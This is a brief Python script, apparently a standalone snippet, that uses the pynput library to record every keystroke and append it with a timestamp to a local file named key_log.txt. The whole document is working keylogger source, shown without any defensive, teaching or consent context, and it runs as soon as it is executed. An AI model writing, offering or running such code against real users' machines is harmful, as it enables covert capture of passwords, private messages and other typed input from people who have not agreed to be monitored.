from pynput.keyboard import Key, Listener  # pip install pynput
import logging

log_dit=""
logging.basicConfig(filename=(log_dit+"key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as listener:
    listener.join()